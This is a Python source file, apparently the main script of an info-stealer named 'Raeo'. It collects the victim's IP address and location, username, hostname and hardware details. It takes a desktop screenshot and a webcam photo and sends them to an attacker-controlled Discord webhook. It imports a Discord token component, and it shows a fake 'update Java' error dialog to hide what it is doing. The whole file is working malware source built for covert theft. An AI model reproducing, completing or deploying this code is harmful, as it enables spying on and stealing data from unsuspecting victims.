from components import networkinfo, systeminfo, webcam
from components.discordtoken import DiscordToken
from components.config import webhook_url, webcamphoto_check, username, systemdata_check, networkdata_check
from discord import SyncWebhook, Embed, File
from tkinter import messagebox

def Main():  
    internet_data = []
    internet_data = []
    # get the ip adress
    if networkdata_check is True:
        internet_data = networkinfo.get__ip()
    else:
        internet_data = ["None", "None", "None", "None", "None", "None"]

    # get system information
    if systemdata_check is True:
        system_data = systeminfo.get_information()
    else:
        system_data = ["None", "None", "None", "None", "None", "None"]
        

    # take a screenshot of the desktop
    systeminfo.take_screenshot()

    # take a photo with a webcam if available
    try:
        if webcamphoto_check is True:
            webcam.take_photo()
    except:
        print("Webcam access denied")

    # webhook
    webhook = SyncWebhook.from_url(webhook_url)
        

    # embed
    embed = Embed(
        title="**Raeo report**",
        url="https://github.com/areoxy/raeo/",
        description=f"**Internet Data**\n```IP: {internet_data[0]}\nISP: {internet_data[4]}\nCountry: {internet_data[1]}\nRegion: {internet_data[3]}\nCity: {internet_data[2]}```\n-------------------------------------\n**System Data**\n```Username: {system_data[2]}\nHostname: {system_data[5]}\nSystem: {system_data[0]}\nVersion: {system_data[1]}\nCPU: {system_data[3]}\nGPU: {system_data[4]}```\n-------------------------------------\n**Desktop**"
    )
    embed.set_image(url="attachment://screenshot.png")
    embed.set_footer(text="Made by Areo | v1.0.0")

    # send discord 

    try:
        webhook.send(
            embed=embed,
            file=File('.\\screenshot.png', filename='screenshot.png'),
            username=username
        )
    except: 
        print("Failed sending system data webhook")

    if webcamphoto_check is True:
        # embed
        webcam_embed = Embed(
            title="Webcam",
            description=f"**Photo**",
            url="https://github.com/areoxy/raeo/",
        )
        webcam_embed.set_image(url="attachment://webcam.png")
        webcam_embed.set_footer(text="Made by Areo | v1.0.0")

        # send webhook with the webcam photo attached
        try:
            webhook.send(
                embed=webcam_embed,
                file=File('.\\webcam.png', filename='webcam.png'),
                username=username
            )
        except:
            print("Failed sending the webhook with the attached webcam photo")

class App():
    def __init__(self) -> None:
        messagebox.showerror("Error", "Failed starting. RUNTIME ERROR CODE x338 WINDOWS RUNTIME NullPointerException line 39, 45 PLEASE UPDATE JAVA")
        Main()
        return
        

App()
